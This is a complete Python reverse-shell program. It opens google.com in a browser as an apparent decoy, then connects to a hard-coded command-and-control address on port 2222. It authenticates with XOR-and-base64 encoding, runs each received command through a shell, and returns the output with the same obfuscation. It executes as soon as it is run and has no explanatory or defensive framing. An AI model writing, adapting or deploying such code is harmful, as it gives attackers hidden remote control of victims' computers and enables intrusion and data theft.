import socket
import subprocess
import base64
import webbrowser

def xor_encrypt_decrypt(data, key):
    encrypted_bytes = bytes([b ^ key for b in data])
    return base64.b64encode(encrypted_bytes).decode()

def xor_decrypt_base64(data, key):
    decrypted_bytes = base64.b64decode(data)
    return bytes([b ^ key for b in decrypted_bytes]).decode()

XOR_KEY = 22
C2_SERVER = "192.168.1.104"
C2_PORT = 2222

def reverse_tcp():

    webbrowser.open("https://www.google.com")
    
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((C2_SERVER, C2_PORT))

    try:
        auth_message = xor_encrypt_decrypt(b"AUTH", XOR_KEY)
        client.send(auth_message.encode())
    except Exception as e:
        print(f"[!] Failed to send AUTH: {e}")
        client.close()
        return

    while True:
        try:
            encrypted_command = client.recv(1024).decode()
            if not encrypted_command:
                break

            command = xor_decrypt_base64(encrypted_command, XOR_KEY)

            if command.lower() == "exit":
                break

            result = subprocess.run(command, shell=True, capture_output=True, text=True)
            output = result.stdout + result.stderr

            encrypted_output = xor_encrypt_decrypt(output.encode(), XOR_KEY)
            client.send(encrypted_output.encode())

        except Exception as e:
            try:
                error_message = xor_encrypt_decrypt(f"Error: {e}".encode(), XOR_KEY)
                client.send(error_message.encode())
            except:
                pass
            break

    client.close()

reverse_tcp()
